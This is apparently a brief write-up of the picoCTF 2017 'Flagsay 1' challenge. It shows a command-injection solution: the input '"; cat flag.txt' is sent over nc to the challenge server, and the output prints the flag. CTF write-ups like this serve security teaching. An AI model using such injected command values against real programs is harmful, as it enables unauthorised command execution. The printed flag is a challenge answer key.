**Title:** Flagsay 1  
**Category:** Binary Exploitation  
**Points:** 80  
**Description:**

>I heard you like flags, so now you can make your own! Exhilarating! Use [flagsay-1](flagsay-1)! [Source](flagsay-1.c). Connect on shell2017.picoctf.com:16023.  

**Hint:**

>System will run exactly what the program gives it  

## Solution

Since our input is unescaped by the program, we can guess that the flag is as previously in the current folder and called `flag.txt` and just input:  
    $ nc shell2017.picoctf.com 16023  
    "; cat flag.txt  
                   _  
                  //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
                 //  
    19bc7cb34950108982ea0b9e276c822d  
    cat: /: Is a directory
